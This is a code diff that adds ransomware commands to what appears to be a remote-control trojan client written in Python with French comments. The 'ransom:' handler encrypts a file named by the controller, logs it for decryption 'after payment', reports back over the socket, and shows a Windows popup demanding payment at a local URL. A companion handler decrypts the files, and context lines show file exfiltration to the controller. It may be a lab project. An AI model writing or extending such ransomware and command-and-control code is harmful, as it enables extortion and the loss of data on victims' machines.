@@ -227,6 +227,59 @@ def handle_commands(client_socket):
                     send_file(client_socket, file_path, "exfil")
                     time.sleep(1)
 
+
+            elif command.startswith("ransom:"):
+                path = command.split(":", 1)[1]
+                from ransomware import generate_key, load_key, encrypt_file
+                key_path = os.path.join(BASE_DIR, "ransom_key.key")
+                ransom_list_path = os.path.join(BASE_DIR, "ransom_files.txt")
+
+                if not os.path.exists(key_path):
+                    generate_key()
+                key = load_key()
+
+                encrypt_file(path, key)
+
+                # Sauvegarder ce fichier comme à déchiffrer après paiement
+                with open(ransom_list_path, "a") as f:
+                    f.write(path + "\n")
+                    
+                client_socket.send(json.dumps({
+                        "type": "ransom_confirm",
+                        "filename": os.path.basename(path),
+                        "data": path
+                    }).encode())
+
+                # Affiche une popup
+                if IS_WINDOWS:
+                    import ctypes
+                    ctypes.windll.user32.MessageBoxW(
+                        0,
+                        "Vos fichiers ont été chiffrés. Payez pour les restaurer.\nVisitez : http://192.168.162.1:4242/pay",
+                        "Fichier bloqué",
+                        0x10
+                    )
+
+
+            elif command == "unransom_all":
+                from ransomware import load_key, decrypt_file
+                ransom_list_path = os.path.join(BASE_DIR, "ransom_files.txt")
+                key_path = os.path.join(BASE_DIR, "ransom_key.key")
+
+                if os.path.exists(key_path) and os.path.exists(ransom_list_path):
+                    key = load_key()
+                    with open(ransom_list_path, "r") as f:
+                        paths = f.read().splitlines()
+
+                    for path in paths:
+                        decrypt_file(path, key)
+
+                    os.remove(ransom_list_path)
+                    print("[+] Tous les fichiers ont été déchiffrés.")
+                else:
+                    print("[!] Aucune clé ou liste de fichiers à déchiffrer.")
+
+
     
 
     except Exception as e:
